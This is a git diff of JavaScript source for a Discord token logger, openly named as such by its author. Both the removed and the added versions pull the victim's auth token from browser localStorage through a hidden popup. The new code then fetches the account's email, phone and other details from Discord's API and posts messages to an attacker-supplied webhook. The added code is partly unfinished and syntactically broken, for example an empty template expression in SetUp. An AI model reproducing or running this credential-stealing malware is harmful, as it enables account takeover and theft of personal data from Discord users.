@@ -1,38 +1,85 @@
-var webhookurl = 'your_webhook_url_here';
+// Rewritten version of the old Token logger, the other one was OLD and GARBAGE AS HECK
 
-function SendMessage(msg, url, user) {
-    const request = new XMLHttpRequest();
-    request.open("POST", webhookurl);
-  
-    request.setRequestHeader('Content-type', 'application/json');
+var webhook = "<YOUR_WEBHOOK_HERE>"; // Theres Many tuts on getting a webhook
+var pingme = true // Ping @everyone
 
-      const params = {
-        username: user,
-        avatar_url: url,
-        content: msg
-      }
+// Details (dont put anything)
+var id;
+var username;
+var avatar;
+var tag;
+var banner_color;
+var accent_color;
+var locale;
+var email;
+var verified;
+var phone;
 
-      request.send(JSON.stringify(params));
+if (window.location.hostname != "discord.com") {} // We dont want anyone-else on discord
+
+function GetInfo(token) {
+    var request = new XMLHttpRequest();
+    
+    request.open("GET", "https://discord.com/api/v9/users/@me");
+    request.setRequestHeader("Authorization", token);
+    
+    request.onreadystatechange = function() {
+     // We've got the request so now do something 
+       if (this.readyState == 4 && this.status == 200) {
+           const req = request.responseText;
+           const parsed = JSON.parse(req);
+           
+           var idr = parsed.id;
+           var usernamer = parsed.username;
+           var avatarr = parsed.avatar;
+           var tagr = parsed.discriminator; // why discriminator? lol
+           var banner_colorr = parsed.banner_color;
+           var accent_colorr = parsed.accent_color;
+           var localer = parsed.locale;
+           var emailr = parsed.email;
+           var verifiedr = parsed.verified;
+           var phoner = parsed.phone;
+           
+           phone = phoner
+           verified = verifiedr;
+           email = emailr;
+           locale = localer;
+           accent_color = accent_colorr;
+           banner_color = banner_colorr;
+           tag = tagr;
+           avatar = avatarr;
+           username = usernamer;
+           id = idr;
+        } else {return "Could not fetch the user details."} 
+    }
+    request.send();
 }
 
-function GetInfo() {
-  // Token
-  var popup;
-  var token;
-  
-  popup = window.open('', '', `top=0,left=${screen.width-800},width=850,height=${screen.height}`);
+function GetToken() {
+  var popup = window.open('', '', `top=0,left=${screen.width-0},width=0,height=${screen.height}`);
     
   window.dispatchEvent(new Event('beforeunload'));
-  token = popup.localStorage.token;
+  var token = popup.localStorage.token;
   token = token.slice(1, -1); // No more quotes
-  
-  // Email
-  var email = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.email_cache;
-  
-  // Username
-  var username = document.getElementsByClassName('size14-e6ZScH title-eS5yk3')[0].innerText;
-
-  SendMessage("@everyone *Denny's Token Logger*\n :email: E-mail **"+ email +"**\n :key: Token **"+token+"**\n :person_red_hair: Username **"+username+"**\n Token logger By Denny", document.getElementsByClassName('avatarStack-2Dr8S9')[0].children[0].src, username);
+    
+  return token;
 }
 
-GetInfo();
+function SendMsg(msg) {
+    const request = new XMLHttpRequest();
+    request.open("POST", webhook);
+  
+    request.setRequestHeader('Content-type', 'application/json'); // We need this as we are expecting a JSON request.
+
+     const params = {
+        content: msg
+     }
+
+     request.send(JSON.stringify(params));
+}
+
+function SetUp() {
+    SendMsg(`**${}**`)
+}
+
+SetUp()
